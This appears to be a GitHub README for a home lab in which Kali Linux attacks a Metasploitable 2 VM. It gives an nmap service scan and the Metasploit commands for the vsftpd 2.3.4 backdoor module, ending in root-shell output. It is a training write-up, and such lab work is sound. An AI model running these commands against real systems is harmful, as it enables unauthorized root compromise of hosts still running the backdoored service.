# 🔐 Metasploitable Penetration Testing Lab

## 📌 Overview
This project demonstrates a penetration testing workflow using Kali Linux against a vulnerable Metasploitable machine in a controlled lab environment.

---

## 🖥️ Lab Setup
- **Attacker:** Kali Linux  
- **Target:** Metasploitable 2  
- **Platform:** VirtualBox  
- **Network:** Host-only adapter  

---

## 🔍 Enumeration
Performed service and version detection using:

```bash
nmap -sV 192.168.56.102
```
Identified FTP service running vsftpd 2.3.4, a known vulnerable version with a backdoor that allows remote command execution.
---

## 💥 Exploitation
Used Metasploit Framework to exploit the vsftpd backdoor:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

---

## 🧠 Result
Successfully exploited the vsftpd backdoor and obtained root-level access on the target system.

```bash
uid=0(root)
```

### 🔍 Nmap Scan

Shows open ports and vulnerable services discovered on the target:

![Nmap Scan](https://github.com/user-attachments/assets/2505d0e9-66d4-48e8-94e4-ef28732fa837)

---

### 💥 Exploitation via Metasploit
Successful exploitation of the vsftpd backdoor and shell access:

![Exploit](https://github.com/user-attachments/assets/dde8b771-8aa7-44e3-a29d-3f3fab8d92f0)
